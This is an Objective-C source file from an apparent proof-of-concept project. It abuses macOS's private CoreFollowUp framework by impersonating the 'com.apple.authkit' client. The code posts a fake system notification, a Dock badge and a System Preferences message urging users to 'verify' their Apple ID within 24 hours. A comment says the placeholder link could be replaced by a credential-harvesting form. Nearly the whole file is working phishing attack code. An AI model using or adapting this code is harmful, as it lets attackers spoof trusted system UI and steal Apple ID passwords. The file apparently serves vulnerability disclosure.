//
//  CFUPhishingAttack.m
//  CoreFollowUpPoC
//
//  Created by Gui Rambo on 23/12/20.
//

#import "CFUPhishingAttack.h"

#import "CoreFollowUp.h"

@interface CFUPhishingAttack ()

@property (strong) FLFollowUpController *followUpController;

@end

@implementation CFUPhishingAttack

- (instancetype)init
{
    self = [super init];
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/CoreFollowUp.framework"] load];
    
    self.followUpController = [[NSClassFromString(@"FLFollowUpController") alloc] initWithClientIdentifier:@"com.apple.authkit"];
    NSLog(@"%@", self.followUpController);
    
    return self;
}

- (void)postNotification
{
    // This code posts a follow up item that sends a notification, badges the System Preferences app icon in the Dock,
    // and shows a scary-looking message in system preferences below the user's Apple ID. The URL is just a placeholder
    // for this proof-of-concept, but it could be very well be an official-looking form where the user is required
    // to fill in their Apple ID and password (and other information) for a phishing attack.
    
    FLFollowUpItem *item = [NSClassFromString(@"FLFollowUpItem") new];
    item.title = @"Please confirm your Apple ID information";
    item.informativeText = @"We have identified an issue with your Apple ID that requires your immediate attention. Please verify your information within the next 24 hours to preserve access to Apple's services.";
    item.groupIdentifier = kFollowUpGroupAccount;
    item.displayStyle = 4;
    item.actions = @[[NSClassFromString(@"FLFollowUpAction") actionWithLabel:@"Verify Now" url:[NSURL URLWithString:@"x-rambo-followup://login"]]];

    FLFollowUpAction *activateAction = [NSClassFromString(@"FLFollowUpAction") new];
    activateAction.label = @"Verify Now";
    activateAction.launchActionURL = [NSURL fileURLWithPath:@"/System/Applications/System Preferences.app"];

    FLFollowUpNotification *note = [NSClassFromString(@"FLFollowUpNotification") new];
    note.activateAction = activateAction;
    note.title = @"Verify your Apple ID Information";
    note.informativeText = @"Please verify your Apple ID information within the next 24 hours to preserve access to Apple's services.";
    item.notification = note;
    
    [self.followUpController postFollowUpItem:item completion:^(BOOL success, NSError *error) {
        NSLog(@"Post item success = %@, error = %@", @(success), error);
    }];
}

- (void)clearNotification
{
    [self.followUpController clearPendingFollowUpItemsWithCompletion:^(BOOL success, NSError *error) {
        NSLog(@"Clear items success = %@, error = %@", @(success), error);
    }];
}

@end
